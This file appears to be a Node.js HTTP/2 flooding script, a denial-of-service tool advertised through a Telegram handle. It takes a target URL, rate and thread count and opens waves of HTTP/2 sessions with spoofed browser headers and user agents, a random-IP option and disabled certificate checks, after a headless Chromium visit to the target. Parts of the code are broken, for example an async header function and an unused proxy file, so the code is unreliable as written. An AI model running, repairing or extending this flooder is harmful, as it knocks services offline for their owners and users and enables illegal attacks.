const http2 = require('http2');
const fs = require('fs');
const path = require('path');
const url = require('url');
const UserAgent = require('user-agents');
const { HeaderGenerator } = require('header-generator');
const tls = require('tls');
const { chromium } = require('playwright');

const [targetUrl, time, rate, thread, proxyFile] = process.argv.slice(2);

if (!targetUrl || !time || !rate || !thread || !proxyFile) {
    console.log('t.me/dosleak : node main.js [url] [time] [rate] [thread] [proxyfile]');
    process.exit(1);
}

let headerGenerator = new HeaderGenerator({
    browsers: [
        { name: "chrome", minVersion: 100, httpVersion: "2" },
    ],
    devices: [
        "desktop",
    ],
    operatingSystems: [
        "windows",
    ],
    locales: ["en-US", "en"]
});

async function sendRequest(session) {
    return new Promise((resolve, reject) => {
        const headers = generateHeaders();
        const req = session.request(headers);

        req.setEncoding('utf8');
        let data = '';

        req.on('data', (chunk) => {
            data += chunk;
        });

        req.on('end', () => {
            console.log(`Received response`);
            resolve(data);
        });

        req.on('error', (err) => {
            console.error(`Error sending request: ${err.message}`);
            reject(err);
        });

        console.log('Sending request...');
        req.end();
    });
}

async function generateHeaders() {
    const userAgentv2 = new UserAgent();
    const useragent = userAgentv2.toString();
    const generatedHeaders = headerGenerator.getHeaders({
        httpVersion: '2',
        withRandomIP: true
    });

    return {
        ':path': '/',
        ...generatedHeaders,
        'user-agent': useragent,
    };
}

async function flood() {
    const startTime = Date.now();
    const endTime = startTime + parseInt(time, 10) * 1000;
    const requestsPerThread = parseInt(rate, 10) / parseInt(thread, 10);

    const parsedUrl = url.parse(targetUrl);

    while (Date.now() < endTime) {
        const promises = [];

        for (let i = 0; i < requestsPerThread; i++) {
            const session = http2.connect(targetUrl, {
                ALPNProtocols: ['h2'],
                servername: parsedUrl.hostname,
                rejectUnauthorized: false
            });

            session.on('socketError', (err) => {
                console.error(`Socket error: ${err.message}`);
                session.destroy();
            });

            session.on('error', (err) => {
                console.error(`Client error: ${err.message}`);
                session.destroy();
            });

            const promise = sendRequest(session);
            promises.push(promise);

            promise.then(() => {
                session.close();
            }).catch((err) => {
                console.error(`Error closing session: ${err.message}`);
            });
        }

        try {
            await Promise.all(promises);
        } catch (err) {
            console.error(`Error sending requests: ${err.message}`);
        }
    }
}

(async () => {
    try {
        const browser = await chromium.launch();
        const context = await browser.newContext();
        const page = await context.newPage();

        await page.goto(targetUrl);


    } catch (err) {
        console.error(`Error: ${err.message}`);
    } finally {
        flood();
    }
})();
